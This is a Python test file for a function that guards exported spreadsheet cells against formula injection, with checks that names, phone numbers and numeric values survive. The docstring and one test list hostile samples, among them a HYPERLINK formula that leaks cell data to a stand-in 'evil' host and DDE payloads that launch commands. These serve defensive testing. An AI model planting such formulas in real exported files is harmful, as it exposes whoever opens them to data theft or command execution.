"""CSV/XLSX formula-injection hardening.

Student names and group names are user- and staff-editable free text and land directly
in exported spreadsheets. Excel and LibreOffice execute any cell whose text begins with
=, +, -, @, or a leading tab/CR, so an exported name like

    =HYPERLINK("http://evil/?x="&A1,"Click")

becomes a live, clickable exfiltration link when a curator opens the file.

Pure functions, no database.
"""
import pytest

from src.services.excel_export_service import sanitize_spreadsheet_value


@pytest.mark.parametrize("payload", [
    '=HYPERLINK("http://evil/?x="&A1,"Click")',
    "=1+1",
    "+cmd|'/c calc'!A0",
    "-2+3+cmd|'/c calc'!A0",
    "@SUM(1:1)",
    "\tSUM(1:1)",
    "\r=1+1",
])
def test_dangerous_sigils_are_neutralised(payload):
    out = sanitize_spreadsheet_value(payload)
    assert out != payload
    assert out.startswith("'"), f"expected a leading apostrophe guard, got {out!r}"


@pytest.mark.parametrize("payload", [
    "Alikhan Nurlanov",
    "Айгерім Жақсылық",   # non-Latin names must survive unchanged
    "May 9 - SAT August",
    "+70000000000",          # a phone number is not a formula once guarded
    "student@example.com",
])
def test_ordinary_values_survive_recognisably(payload):
    out = sanitize_spreadsheet_value(payload)
    # Either untouched, or guarded but still containing the original text.
    assert payload in out


def test_plain_names_are_not_modified():
    assert sanitize_spreadsheet_value("Alikhan Nurlanov") == "Alikhan Nurlanov"


def test_leading_plus_phone_is_guarded_but_readable():
    """A leading + is a formula sigil in Excel, so it must be guarded - but the
    number must remain legible, not mangled or stripped."""
    out = sanitize_spreadsheet_value("+70000000000")
    assert out == "'+70000000000"


def test_none_passes_through():
    assert sanitize_spreadsheet_value(None) is None


def test_numbers_are_left_as_native_types():
    """Numeric cells must stay numeric so Excel can aggregate them."""
    assert sanitize_spreadsheet_value(1470) == 1470
    assert sanitize_spreadsheet_value(7.5) == 7.5
    assert sanitize_spreadsheet_value(True) is True


def test_empty_string_is_safe():
    assert sanitize_spreadsheet_value("") == ""


def test_whitespace_only_is_safe():
    assert sanitize_spreadsheet_value("   ") == "   "


def test_sigil_inside_the_string_is_not_guarded():
    """Only a LEADING sigil is dangerous; guarding mid-string text would corrupt
    legitimate values like 'Grade A+ = excellent'."""
    value = "Grade A+ = excellent"
    assert sanitize_spreadsheet_value(value) == value
